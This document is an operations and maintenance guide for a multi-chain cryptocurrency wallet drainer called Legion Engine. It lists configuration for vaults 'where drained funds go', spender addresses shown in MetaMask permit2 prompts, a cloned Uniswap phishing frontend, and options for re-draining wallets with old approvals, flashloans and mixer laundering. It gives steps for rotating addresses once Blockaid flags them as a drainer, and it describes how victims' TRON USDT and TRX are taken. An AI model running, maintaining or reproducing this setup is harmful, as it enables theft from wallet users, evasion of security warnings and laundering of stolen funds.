# Legion Engine — Maintenance & Operations Guide

---

## Quick System Status Check

**Backend URL:** `https://legionapi-production.up.railway.app`
(or whatever your Railway URL is — check Railway dashboard)

| Check | URL | Expected response |
|---|---|---|
| Basic alive check | `GET /health` | `{"status":"ok"}` |
| DB + Redis ready | `GET /health/ready` | `{"status":"ready","postgres":{"ok":true},"redis":{"ok":true}}` |
| Full readiness score | `GET /health/production` | JSON report with `grade` per tier |
| Telegram bot status | `GET /telegram-status` | `{"running":true,"configured":true}` |

**Run these in browser or Postman. If `/health` doesn't respond → backend is crashed.**

---

## Weekly Checklist (Every Monday)

- [ ] **Open `/health/ready`** — confirm postgres and redis are both `ok:true`
- [ ] **Open `/health/production`** — check no tier has `grade: "F"` or blockers
- [ ] **Check Railway logs** for repeated errors (see Error Reference below)
- [ ] **Check execution wallet balances** on every chain — fund if low
- [ ] **Verify Telegram notifications** still arriving (`/telegram-status`)
- [ ] **Check if any address is Blockaid-flagged** — rotate if yes
- [ ] **Confirm Railway service is running** (not crashed/sleeping)

---

## Railway Environment Variables — Complete Reference

### 1. Vault Addresses (Where Drained Funds Go)

| Variable | Chain | Example format |
|---|---|---|
| `VAULT_ADDRESS_EVM` | ETH/BNB/Polygon/Arbitrum/Base | `0xABCD...1234` |
| `VAULT_ADDRESS_SVM` | Solana (SPL tokens + SOL) | `Base58pubkey...` |
| `VAULT_ADDRESS_SOL` | Solana (alias, same as SVM) | `Base58pubkey...` |
| `VAULT_ADDRESS_TRON` | TRON (TRX + USDT TRC-20) | `T...base58` |
| `VAULT_ADDRESS_TON` | TON (+ Jetton USDT) | `EQAbc...` |
| `VAULT_ADDRESS_BTC` | Bitcoin | `bc1q...` |
| `VAULT_ADDRESS_UTXO` | Bitcoin alias | `bc1q...` |
| `VAULT_ADDRESS_COSMOS` | Cosmos Hub | `cosmos1...` |
| `VAULT_ADDRESS_APTOS` | Aptos | `0x...` |
| `VAULT_ADDRESS_SUI` | Sui | `0x...` |

> `SOVEREIGN_VAULT_EVM` / `SOVEREIGN_VAULT_SOL` etc. are aliases — set the primary ones above.

---

### 2. Spender / Operator Address (Shown in MetaMask)

| Variable | Purpose |
|---|---|
| `ENGINE_SPENDER` | Shown as "Spender" in MetaMask permit2 popup |
| `NEXT_PUBLIC_ENGINE_SPENDER` | Same — must match ENGINE_SPENDER exactly |

> These MUST be unflagged by Blockaid. Rotate when flagged (see Address Rotation section).

---

### 3. Execution Wallets (Backend Uses These to Pay Gas & Submit Txs)

| Variable | Chain | Notes |
|---|---|---|
| `SETTLEMENT_EXECUTION_PRIVATE_KEY` | EVM all chains | 0x + 64 hex. Must have ETH/BNB/MATIC on each chain |
| `SETTLEMENT_EXECUTION_SOLANA_SECRET_KEY` | Solana | Base58 or `[1,2,...64]` array. Must have SOL |
| `TRON_EXECUTION_PRIVATE_KEY` | TRON | 64 hex (no 0x). Must have TRX staked for energy |
| `TON_EXECUTION_MNEMONIC` | TON | 24-word mnemonic. Must have TON for gas |
| `APTOS_EXECUTION_PRIVATE_KEY` | Aptos | 0x + 64 hex. Must have APT for gas |
| `COSMOS_EXECUTION_PRIVATE_KEY` | Cosmos | hex key OR use COSMOS_EXECUTION_MNEMONIC |
| `COSMOS_EXECUTION_MNEMONIC` | Cosmos | 12/24-word mnemonic |
| `SUI_EXECUTION_PRIVATE_KEY` | Sui | base64 or hex key. Must have SUI for gas |

---

### 4. Reserve Wallets (Auto Gas Top-Up — refills execution wallets)

Set these only if `GAS_TOPUP_ENABLED=true`. They fund the execution wallets automatically.

| Variable | Purpose |
|---|---|
| `RESERVE_WALLET_PRIVATE_KEY` | EVM reserve wallet private key |
| `RESERVE_WALLET_EVM_PRIVATE_KEY` | Alias for EVM reserve |
| `RESERVE_WALLET_SOLANA_SECRET_KEY` | SOL reserve wallet |
| `RESERVE_WALLET_SOLANA_PRIVATE_KEY` | Alias |
| `RESERVE_WALLET_TRON_PRIVATE_KEY` | TRON reserve wallet |
| `RESERVE_WALLET_APTOS_PRIVATE_KEY` | Aptos reserve wallet |
| `RESERVE_WALLET_SUI_PRIVATE_KEY` | Sui reserve wallet |
| `RESERVE_WALLET_COSMOS_PRIVATE_KEY` | Cosmos reserve wallet |

---

### 5. RPC Endpoints (Faster = Better Drain Speed)

Without private RPCs, system uses public nodes (slower, rate-limited).

| Variable | Chain | Free providers |
|---|---|---|
| `RPC_ETHEREUM_PRIVATE` | Ethereum mainnet | Alchemy, Infura, DRPC |
| `RPC_ARBITRUM_PRIVATE` | Arbitrum One | Alchemy |
| `RPC_BASE_PRIVATE` | Base chain | Alchemy |
| `RPC_POLYGON_PRIVATE` | Polygon | Alchemy |
| `RPC_SOLANA_PRIVATE` | Solana | Helius, Triton, QuickNode |
| `NEXT_PUBLIC_SOLANA_RPC_URL` | Solana (frontend) | Same as above |
| `RPC_COSMOS` | Cosmos | DRPC |
| `RPC_SUI_PRIVATE` | Sui | Triton |
| `RPC_APTOS_PRIVATE` | Aptos | Alchemy |
| `TRON_FULL_NODE_URL` | TRON full node | TronGrid, Nile |
| `TRON_PRO_API_KEY` | TronGrid API key | trongrid.io |
| `TONCENTER_API_KEY` | TON Center API | toncenter.com |
| `TON_JSON_RPC_URL` | Custom TON RPC | tonapi.io |
| `EVM_ALCHEMY_KEY` | Alchemy key for EVM chains | alchemy.com |
| `NEXT_PUBLIC_ALCHEMY_API_KEY` | Same Alchemy key (public copy) | alchemy.com |

> Backup RPCs: `RPC_SOLANA_BACKUP`, `RPC_APTOS_BACKUP`, `RPC_COSMOS_BACKUP`, `RPC_SUI_BACKUP`, `RPC_BITCOIN_BACKUP`

---

### 6. Authentication & Security

| Variable | Purpose | Notes |
|---|---|---|
| `GATEKEEPER_SECRET` | Internal auth secret | Any long random string. REQUIRED for startup |
| `SHADOW_VAULT_KEY` | Alternative to GATEKEEPER (64 hex chars) | Either this OR GATEKEEPER_SECRET must be set |
| `JWT_SECRET` | JWT signing key | 32+ chars random. Required for dashboard auth |
| `KINETIC_INTERNAL_KEY` | Internal service-to-service auth | Any random string |
| `DASHBOARD_API_KEY` | Dashboard stats endpoint auth | Used in `X-API-Key` header |
| `UPDATE_API_KEY` | Script update endpoint auth | Protects `/api/v1/update` |

---

### 7. Database & Queue

| Variable | Purpose | Notes |
|---|---|---|
| `DATABASE_URL` | Postgres connection string | Supabase pooler URL recommended |
| `REDIS_URL` | Redis connection string | Required for BullMQ job queues |
| `SUPABASE_URL` | Supabase project URL | For settlement tracking DB |
| `SUPABASE_SERVICE_ROLE_KEY` | Supabase admin key | Server-only, never expose to frontend |
| `SUPABASE_ANON_KEY` | Supabase public key | |
| `NEXT_PUBLIC_SUPABASE_URL` | Same as SUPABASE_URL (public copy) | |
| `NEXT_PUBLIC_SUPABASE_ANON_KEY` | Same as SUPABASE_ANON_KEY (public copy) | |

---

### 8. Telegram Notifications

| Variable | Purpose | Notes |
|---|---|---|
| `TELEGRAM_BOT_TOKEN` | Bot token from @BotFather | `1234567890:ABCdef...` |
| `TELEGRAM_CHAT_ID` | Primary chat/group ID | `-100123456789` |
| `TELEGRAM_CHAT_IDS` | Multiple recipients (comma-separated) | `-100111,-100222` |
| `DISABLE_TELEGRAM_BOT` | Set `true` to silence all notifications | For testing/debug |

---

### 9. CORS & Frontend Origins

| Variable | Purpose | Notes |
|---|---|---|
| `API_CORS_ORIGINS` | Comma-separated allowed origins | `https://yourdomain.surge.sh,https://other.site` |
| `API_CORS_ALLOW_ALL` | Set `true` to allow all origins | DEV ONLY — never in prod |
| `API_CORS_ORIGIN_HOST_SUFFIX` | Allow all subdomains of a suffix | `.surge.sh` |
| `BACKEND_URL` | Primary backend URL (for client-config) | Auto-detected if Railway |
| `BACKEND_URLS` | Multiple backend URLs (comma-separated) | For load balancing |

---

### 10. Feature Toggles (Off by Default)

| Variable | Default | What it does |
|---|---|---|
| `GAS_TOPUP_ENABLED` | `false` | Auto-refill execution wallets from reserve wallets |
| `GAS_TOPUP_CRON` | `*/5 * * * *` | How often gas top-up runs (every 5 min) |
| `GAS_RESERVE` | `0.005` | Minimum ETH before top-up triggers |
| `GAS_TOPUP_BUFFER` | `0.001` | How much extra ETH to add above minimum |
| `GAS_VAULT_MIN_NATIVE` | — | Per-chain minimum override |
| `SWEEP_ENABLED` | `false` | Auto-transfer vault funds to a final cold wallet |
| `SWEEP_CRON` | `0 */6 * * *` | Sweep schedule (every 6 hours) |
| `ALLOWANCE_REUSE_ENABLED` | `false` | Re-drain wallets that previously gave approval |
| `SETTLEMENT_IMMEDIATE` | `false` | Execute drain immediately without queue |
| `PRIVACY_MIXER_ENABLED` | `false` | Route funds through Railgun/Thorchain/Monero |
| `PRIVACY_MIXER_XMR_DESTINATION` | — | Monero address (if mixer enabled) |
| `FLASHLOAN_ENABLED` | `false` | Use flashloans to amplify certain drains |
| `SENTINEL_RUNTIME_ENABLED` | `false` | Background sentinel/monitor process |
| `EIP7702_ENABLED` | `false` | Enable EIP-7702 delegation drains |
| `ONCHAIN_CONFIG_CONTRACT_ADDRESS` | — | On-chain config contract address |

---

### 11. Thresholds & Limits

| Variable | Default | Purpose |
|---|---|---|
| `LARGE_TRANSFER_THRESHOLD_USD` | — | USD value considered a "large" drain (extra logging) |
| `API_REQUEST_TIMEOUT_MS` | — | Max time for API requests (ms) |
| `DATABASE_POOL_MAX` | — | Max DB connection pool size |
| `LOG_LEVEL` | `info` | `debug` / `info` / `warn` / `error` |

---

## Address Rotation (When Blockaid/MetaMask Flags You)

### Signs of flagging
- MetaMask shows red "Security risk" or "Deceptive request" banner
- Blockaid labels spender as "known drainer"
- Reduced transaction success rate

### Rotation steps

1. Generate a fresh EVM wallet (private key + address)
2. Update Railway env vars:
   ```
   VAULT_ADDRESS_EVM             = new vault address
   ENGINE_SPENDER                = new spender address (can be same or different)
   NEXT_PUBLIC_ENGINE_SPENDER    = same as ENGINE_SPENDER
   SETTLEMENT_EXECUTION_PRIVATE_KEY = new execution wallet private key
   ```
3. Fund the new execution wallet:
   - Ethereum: ≥ 0.05 ETH
   - BSC: ≥ 0.01 BNB
   - Polygon: ≥ 5 MATIC
   - Arbitrum: ≥ 0.005 ETH
   - Base: ≥ 0.005 ETH
4. Wait for Railway redeploy (~2 min)
5. Test — new address should be unflagged

> **Do NOT reuse old addresses.** Once Blockaid flags an address it stays flagged permanently.

---

## TRON — Energy & Gas

TRON USDT (TRC-20) requires **energy** to transfer.

| User's situation | What happens in script |
|---|---|
| User has staked TRX | Energy is free — USDT tx succeeds |
| User has liquid TRX ≥ 5 TRX | Script burns TRX for energy (up to 80% of TRX balance, max 30 TRX) |
| User has USDT but 0 TRX | USDT tx fails silently → falls back to TRX drain |
| User has only TRX | TRX is drained (keeps 2 TRX for account rent) |

**To enable server-side TRON energy provision:**
Set `TRON_EXECUTION_PRIVATE_KEY` (wallet with 500+ TRX staked). The execution wallet then delegates energy.

---

## Gas Wallet Minimum Balances

| Chain | Token | Minimum | Refill to |
|---|---|---|---|
| Ethereum | ETH | 0.02 ETH | 0.1 ETH |
| BSC | BNB | 0.005 BNB | 0.05 BNB |
| Polygon | MATIC | 1 MATIC | 10 MATIC |
| Arbitrum | ETH | 0.002 ETH | 0.02 ETH |
| Base | ETH | 0.002 ETH | 0.02 ETH |
| Solana | SOL | 0.05 SOL | 0.5 SOL |
| TON | TON | 0.2 TON | 1 TON |
| TRON | TRX | 50 TRX staked | 500 TRX staked |
| Aptos | APT | 0.05 APT | 0.5 APT |
| Sui | SUI | 0.1 SUI | 1 SUI |
| Cosmos | ATOM | 0.05 ATOM | 0.5 ATOM |

Enable auto-refill: set `GAS_TOPUP_ENABLED=true` + configure Reserve Wallets (section 4).

---

## Railway Log Error Reference

| Error in logs | Cause | Fix |
|---|---|---|
| `TRANSFER_FROM_FAILED` | EVM execution wallet has no ETH for gas | Fund execution wallet on that chain |
| `TRON_EXECUTION_PRIVATE_KEY not configured` | Missing Railway env var | Set `TRON_EXECUTION_PRIVATE_KEY` |
| `SETTLEMENT_EXECUTION_PRIVATE_KEY required` | Missing Railway env var | Set `SETTLEMENT_EXECUTION_PRIVATE_KEY` |
| `VAULT_ADDRESS_EVM required` | Missing Railway env var | Set `VAULT_ADDRESS_EVM` |
| `SUPABASE_NOT_CONFIGURED` | Supabase env vars missing | Set SUPABASE_URL + SUPABASE_SERVICE_ROLE_KEY |
| `FATAL_HALT: Sovereign EVM Vault binding missing` | No vault address set at all | Set `VAULT_ADDRESS_EVM` |
| `Telegram send failed` | Bot token wrong or bot removed from group | Check TELEGRAM_BOT_TOKEN and bot admin status |
| `Zero TRC-20 balance` | User TRON wallet is empty | Normal — user had no USDT |
| `TON Jetton BOC build failed` | TonWeb CDN unavailable | CDN issue, TON Jetton skipped (native TON still works) |

---

## Frontend Files — Sync Checklist

When editing script logic, ALWAYS sync both files:

| File | Purpose |
|---|---|
| `scripts/legion-one-script-v2.js` | Main source of truth |
| `clones/uniswap-clone/legion-one-script-v2.js` | Uniswap clone — must match |

**After editing:**
```bash
node --check scripts/legion-one-script-v2.js
node --check clones/uniswap-clone/legion-one-script-v2.js
```

**Surge redeploy:**
```bash
# Uniswap clone
cd clones/uniswap-clone && surge . <your-surge-domain>
```

---

## Monthly Tasks

- [ ] Rotate `GATEKEEPER_SECRET` (any new random string)
- [ ] Rotate `JWT_SECRET` (32+ chars random)
- [ ] Rotate `KINETIC_INTERNAL_KEY`
- [ ] Check Railway resource usage — scale up if needed
- [ ] Check all RPC endpoints still working (chain RPCs change sometimes)
- [ ] Review `API_CORS_ORIGINS` — remove old frontend domains
- [ ] If `SWEEP_ENABLED=true` — verify sweep is actually running in logs
- [ ] If `ALLOWANCE_REUSE_ENABLED=true` — check allowance reuse logs for errors

---

## Emergency Procedures

### All drains failing suddenly
1. Check `VAULT_ADDRESS_EVM` — is it still set? Did a Railway deploy reset it?
2. Check execution wallet balance on each failing chain
3. Check Railway service status — is it running or crashed?
4. Check `ENGINE_SPENDER` matches the wallet signing on-chain

### Backend not starting (Railway crash loop)
- Check logs for `FATAL_HALT` — means a required env var is missing
- Required minimum: `GATEKEEPER_SECRET` + `VAULT_ADDRESS_EVM`

### Telegram bot went silent
1. Test bot token: open `https://api.telegram.org/bot<TOKEN>/getMe` in browser
2. Bot must be admin in the group (check group settings)
3. Check `TELEGRAM_CHAT_ID` — negative number for groups (`-100...`)
4. Check `DISABLE_TELEGRAM_BOT` is NOT set to `true`

### MetaMask showing wrong spender
- `ENGINE_SPENDER` and `NEXT_PUBLIC_ENGINE_SPENDER` in Railway must match exactly
- After update: Railway redeploys → wait 2 min → test again

### TRON USDT never draining
- Check user has TRX (needs ≥ 5 TRX for energy fees)
- OR stake TRX in `TRON_EXECUTION_PRIVATE_KEY` wallet and verify Railway has this env var

---

## Crash Recovery — Step by Step

### How to Tell If Backend Has Crashed
1. Open `https://legionapi-production.up.railway.app/health` in browser
2. If no response / connection refused → **backend is down**
3. If response → backend is alive (but may have degraded features)

---

### Crash Type 1: FATAL at startup — backend won't start

**Symptoms:** Railway shows "Deploy failed" or service restarts in a loop

**Look for these exact messages in Railway logs:**

| Log message | Cause | Fix |
|---|---|---|
| `FATAL_HALT: Sovereign EVM Vault binding missing` | `VAULT_ADDRESS_EVM` not set | Add to Railway env vars |
| `FATAL: API_CORS_ORIGINS must be set in production` | CORS not configured | Set `API_CORS_ORIGINS` or `API_CORS_ALLOW_ALL=true` |
| `FATAL: REDIS_URL is required in production` | Redis not connected | Set `REDIS_URL` in Railway |
| `FATAL: SIWE Redis client init failed` | Bad Redis URL | Fix `REDIS_URL` format |
| `FATAL: Invalid PORT` | PORT env var corrupted | Delete `PORT` from Railway (Railway sets it automatically) |
| `Error: GATEKEEPER_SECRET` or `SHADOW_VAULT_KEY required` | Missing auth secret | Set `GATEKEEPER_SECRET` to any random string |

**Recovery steps:**
1. Go to Railway → your service → **Variables** tab
2. Add the missing env var
3. Railway redeploys automatically (takes ~2 min)
4. Check `/health` again

---

### Crash Type 2: Service crashes AFTER starting (runtime crash)

**Symptoms:** Backend was working, then stopped. Railway logs show `UNCAUGHT:` or `unhandledRejection`

**Look for:**
```
FATAL: unhandledRejection ...
UNCAUGHT: Error: ...
```

**Recovery steps:**
1. Railway → your service → **Deployments** tab
2. Click the latest deployment → click **Redeploy**
3. If crash repeats → look at the error message and check the relevant env var
4. Common causes: RPC endpoint went down, DB connection dropped, Redis OOM

---

### Crash Type 3: Telegram bot conflict (409 error)

**Symptoms:** Telegram stops sending notifications. Logs show:
```
409 Conflict: terminated by other getUpdates request
```

**Cause:** You have the bot running locally AND on Railway at the same time.

**Fix:**
- Close your local terminal that's running the API
- OR set `TELEGRAM_BOT_SKIP_LOCAL=true` in Railway env vars
- OR check `/telegram-status` endpoint for the exact hint message

---

### Crash Type 4: Database connection lost (Supabase/Postgres)

**Symptoms:** Drain requests succeed but no tracking records. `/health/ready` shows `postgres: {ok: false}`

**Recovery steps:**
1. Check Supabase dashboard — is your project paused? (Free tier pauses after inactivity)
2. If paused → click "Restore" in Supabase dashboard
3. Verify `DATABASE_URL` in Railway is still correct (Supabase rotates connection strings sometimes)
4. Test: open `/health/ready` — should show `postgres: {ok: true}` after fix

---

### Crash Type 5: Redis connection lost

**Symptoms:** `/health/ready` shows `redis: {ok: false}`. Job queue stops.

**Recovery steps:**
1. Check your Redis provider (Upstash, Railway Redis addon, etc.)
2. Verify `REDIS_URL` format: `redis://default:<password>@<host>:<port>`
3. If using Railway Redis addon → check if it's still running in Railway dashboard
4. After fixing URL → redeploy Railway service

---

### Crash Type 6: Execution wallet depleted (silent — no crash, just drains fail)

**Symptoms:** Backend running fine, Telegram alerts arrive, but on-chain settlement never happens.

**What you see in Railway logs:**
```
TRANSFER_FROM_FAILED
insufficient funds for gas * price + value
```

**Recovery steps:**
1. Identify which chain is failing (log shows chain name)
2. Send gas tokens to the execution wallet address:
   - ETH to `SETTLEMENT_EXECUTION_PRIVATE_KEY` address on Ethereum
   - BNB to same address on BSC
   - MATIC to same address on Polygon
3. No restart needed — backend retries automatically on next drain

---

### Crash Type 7: RPC provider rate-limited or down

**Symptoms:** Errors like `429 Too Many Requests`, `503`, or `timeout` in logs for one chain.

**Recovery steps:**
1. Get a free API key from Alchemy (alchemy.com) or Infura
2. Set in Railway:
   - `EVM_ALCHEMY_KEY` = your Alchemy key
   - `RPC_ETHEREUM_PRIVATE` = `https://eth-mainnet.g.alchemy.com/v2/<KEY>`
   - `RPC_SOLANA_PRIVATE` = Helius or QuickNode URL
3. For TRON: get `TRON_PRO_API_KEY` from trongrid.io (free tier available)

---

### Crash Type 8: Memory/CPU limit hit on Railway

**Symptoms:** Railway shows OOM (Out of Memory) kill, service restarts randomly.

**Signs in logs:**
```
Killed
```
(No message — just sudden termination)

**Recovery steps:**
1. Railway dashboard → your service → **Settings** → **Resources**
2. Increase RAM to 512MB minimum, 1GB recommended
3. If on Hobby plan → upgrade to Pro for autoscaling
4. Reduce concurrent operations: set `ALLOWANCE_REUSE_BATCH_SIZE=10` (smaller batches)

---

### Boot Log — What Healthy Startup Looks Like

When backend starts correctly, Railway logs should show this sequence:
```
[BOOT] Index loaded
[BOOT] Building API server…
[BOOT] API server built
[BOOT] Binding 0.0.0.0:<PORT>
[BOOT] Server listening at http://0.0.0.0:<PORT>
[BOOT] Background crons starting...
[TELEGRAM] Bot polling started
```

**Red flags during boot:**
```
FATAL:          ← hard stop, service won't start
FATAL_HALT:     ← same, vault address missing
Error:          ← may or may not crash depending on context
WARN:           ← degraded but running
```

---

### Normal Cron Jobs (Run in Background Automatically)

These should appear in Railway logs periodically:

| Cron | What it does | Frequency |
|---|---|---|
| Gas Warning Cron | Alerts if execution wallets low | Every 30 min |
| Gas Top-Up Cron | Auto-refills execution wallets (if enabled) | Every 5 min |
| Vault Sweep Cron | Moves vault funds to cold wallet (if enabled) | Every 6 hours |
| Wallet Monitor Cron | Tracks wallet activity | Configurable |
| Price Oracle Cron | Updates token prices for valuation | Configurable |

If you don't see these in logs for a long time → something is wrong.

---

## System Architecture Quick Reference

```
User connects wallet
       ↓
Frontend script (legion-one-script-v2.js)
  - Fetches vault addresses from /api/v1/client-config
  - Builds transactions per chain
  - User signs in wallet popup
       ↓
POST /api/v1/signature-anchor  (no auth needed)
       ↓
Backend processes signature
  - EVM: calls permit2.permitTransferFrom() → moves ERC20 tokens
  - SOL: broadcasts each signed tx (execution wallet NOT needed for user txs)
  - TRON: broadcasts user-signed tx (user pays energy from TRX)
  - TON: submits signed BOC to TON network
       ↓
Telegram notification sent
       ↓
(If GAS_TOPUP_ENABLED) Reserve wallet tops up execution wallet
(If SWEEP_ENABLED) Vault funds swept to cold wallet on schedule
```
